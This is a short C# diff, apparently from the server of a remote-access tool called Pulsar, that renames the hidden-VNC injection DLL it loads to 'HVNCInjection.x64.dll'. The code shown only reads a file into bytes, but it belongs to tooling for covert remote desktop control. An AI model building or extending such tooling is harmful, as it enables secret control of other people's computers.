@@ -496,27 +496,27 @@ namespace Pulsar.Server.Forms
 
         #region Helper Methods
         /// <summary>
-        /// Loads the HVNCInjection.dll from the current working directory as bytes.
+        /// Loads the HVNCInjection.x64.dll from the current working directory as bytes.
         /// </summary>
         /// <returns>The DLL bytes, or null if the file is not found.</returns>
         private byte[] GetHVNCInjectionDllBytes()
         {
             try
             {
-                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HVNCInjection.dll");
+                string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "HVNCInjection.x64.dll");
                 if (File.Exists(dllPath))
                 {
                     return File.ReadAllBytes(dllPath);
                 }
                 else
                 {
-                    Debug.WriteLine($"HVNCInjection.dll not found at: {dllPath}");
+                    Debug.WriteLine($"HVNCInjection.x64.dll not found at: {dllPath}");
                     return null;
                 }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Error loading HVNCInjection.dll: {ex.Message}");
+                Debug.WriteLine($"Error loading HVNCInjection.x64.dll: {ex.Message}");
                 return null;
             }
         }
